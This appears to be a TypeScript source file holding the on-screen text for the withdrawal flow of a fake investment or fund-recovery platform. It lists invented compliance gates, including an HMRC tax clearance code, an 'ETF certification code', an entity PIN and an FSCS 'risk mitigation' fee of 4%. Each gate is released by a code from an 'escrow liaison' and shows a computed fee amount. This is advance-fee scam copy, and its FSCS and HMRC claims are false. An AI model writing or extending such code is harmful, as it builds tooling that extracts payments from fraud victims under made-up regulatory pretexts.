import type { WithdrawalStage } from "@/lib/types/api";

export type WithdrawalMethodKey = "crypto" | "bank";

export type WithdrawalMethodDescriptor = {
  key: WithdrawalMethodKey;
  title: string;
};

export const withdrawalMethodTabs: WithdrawalMethodDescriptor[] = [
  {
    key: "crypto",
    title: "Bitcoin Transfer",
  },
  {
    key: "bank",
    title: "Bank Transfer",
  },
];

export type WithdrawalCryptoOption = {
  id: string;
  label: string;
  symbol: string;
  network: string;
  description: string;
  icon: string;
};

export const withdrawalCryptoOptions: WithdrawalCryptoOption[] = [
  {
    id: "bitcoin",
    label: "Bitcoin (BTC)",
    symbol: "₿",
    network: "bitcoin",
    description: "Global settlement rail with deep liquidity.",
    icon: "/dashboard/account_overview/btc.png",
  },
  {
    id: "ethereum",
    label: "Ethereum (ETH)",
    symbol: "Ξ",
    network: "ethereum",
    description: "ERC-20 friendly route for smart-contract wallets.",
    icon: "/dashboard/account_overview/Etherum.png",
  },
  {
    id: "usdt-trc20",
    label: "USDT (TRC20)",
    symbol: "₮",
    network: "tron",
    description: "Stablecoin payout over low-fee Tron network.",
    icon: "/dashboard/account_overview/dollar-symbol.png",
  },
];

export interface WithdrawalStageCopy {
  eyebrow?: string;
  title: string;
  lead: string;
  description?: string;
  note?: string;
  progress?: number;
  learnMoreLabel?: string;
  learnMoreUrl?: string;
  pinLabel?: string;
}

const STAGE_BASE_COPY: Record<WithdrawalStage, WithdrawalStageCopy> = {
  tax_clearance: {
    eyebrow: "Compliance",
    title: "Tax clearance code required",
    lead: "You are required to complete your tax clearance to proceed with the withdrawal of your funds.",
    description:
      "The tax remittance authorizes HMRC to clear the recovered balance for release.",
    note: "Your escrow liaison provides the clearance reference once the compliance levy is settled.",
    learnMoreLabel: "Learn more",
    pinLabel: "Tax clearance code",
    progress: 75,
  },
  etf_code: {
    eyebrow: "Escrow Compliance",
    title: "ETF certification code",
    lead: "Your payout is queued under the Exchange Trust Fund register.",
    description: "Confirm the ETF compliance code shared by your liaison to continue settlement.",
    note: "Codes follow a 48-hour validity cycle and expire if unused.",
    learnMoreLabel: "Learn more",
    pinLabel: "ETF code",
    progress: 82,
  },
  entity_pin: {
    eyebrow: "Security",
    title: "Entity security PIN required",
    lead: "Fully ready to be sent. Confirm your withdrawal and identity by entering your entity security PIN.",
    description: "The PIN links the reclaiming entity to the approved payout file.",
    note: "Our escrow team will provide you with your entity security PIN within 48 hours.",
    pinLabel: "Entity PIN",
    progress: 90,
  },
  fscs_code: {
    eyebrow: "Risk Mitigation",
    title: "FSCS risk mitigation code",
    lead: "The Financial Services Compensation Scheme (FSCS) insures balances up to €16,057 held by PRA-authorized escrow banks.",
    description:
      "Beyond the threshold, a mitigation charge of 4% must be registered within eight business days to keep the protection active.",
    note: "Protection for FX or stock trading is exempted during this window and must be promptly remitted in compliance with FSCS regulations.",
    pinLabel: "Mitigation code",
    progress: 95,
  },
  regulation_code: {
    eyebrow: "Final Verification",
    title: "Regulation compliance code",
    lead: "Regulators require a final compliance code that certifies the beneficiary wallet or bank channel.",
    note: "Submit the code shared by the compliance department to seal the transfer.",
    pinLabel: "Regulation code",
    progress: 98,
  },
  fund_transfer_pin: {
    eyebrow: "Security",
    title: "Fund transfer pin required",
    lead: "To protect you against unauthorized withdrawals, a Funds Transfer Pin has been sent to your email.",
    description: "Insert the pin to proceed with your withdrawal request.",
    pinLabel: "Transfer pin",
    progress: 20,
  },
};

export function getWithdrawalStageCopy(
  stage: WithdrawalStage,
  opts: { amount?: number; percent?: number; showPercent?: boolean; message?: string | null } = {}
): WithdrawalStageCopy {
  const base = STAGE_BASE_COPY[stage];
  const amountLabel =
    typeof opts.amount === "number"
      ? Intl.NumberFormat("en-US", { style: "currency", currency: "USD" }).format(opts.amount)
      : null;
  const percentLabel =
    typeof opts.percent === "number" && opts.showPercent !== false
      ? `${opts.percent.toFixed(2)}%`
      : null;

  let description = base.description;

  if (amountLabel && percentLabel) {
    description = description
      ? `${description} (${percentLabel} ≈ ${amountLabel}).`
      : `(${percentLabel} ≈ ${amountLabel}).`;
  } else if (amountLabel) {
    description = description ? `${description} (≈ ${amountLabel}).` : `≈ ${amountLabel}`;
  }

  const lead = opts.message ?? base.lead;

  return {
    ...base,
    lead,
    description,
  };
}
